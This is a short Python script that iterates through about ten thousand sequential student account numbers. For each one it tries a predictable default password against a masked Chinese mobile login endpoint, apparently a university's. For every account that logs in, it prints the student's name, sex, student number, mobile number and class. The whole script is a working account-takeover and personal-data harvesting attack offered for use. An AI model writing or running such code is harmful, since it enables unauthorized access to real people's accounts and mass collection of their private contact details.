#Author:AlexanderZ.Tang
#For personal use
import requests
url = 'https://*****.cn/mobile/rpc?p=/v2/login/login'#sry for fake url
false = False
for i in range(10000,19999):
    userName = '2019008' + str(i)
    password = 'whsdu@'+'2019008'+ str(i)
    #that's true:)
    json = {
        "jsonrpc": "2.0",
        "method": "/v2/login/login",
        "id": 1,
        "params": [userName, password, false]
    }
    r = requests.post(url, json=json)
    #print(r.json())
    r_json = r.json()
    if ('error' in r_json):
        continue
    name = r_json.get('result').get('display_name')
    sex = r_json.get('result').get('sex').get('display_name')
    stuNum = r_json.get('result').get('account')
    mobile = r_json.get('result').get('mobile')
    cla = r_json.get('result').get('department').get('display_name')
    print(name,sex,'学号:'+ stuNum,'手机:'+ mobile,'班级:'+ cla)
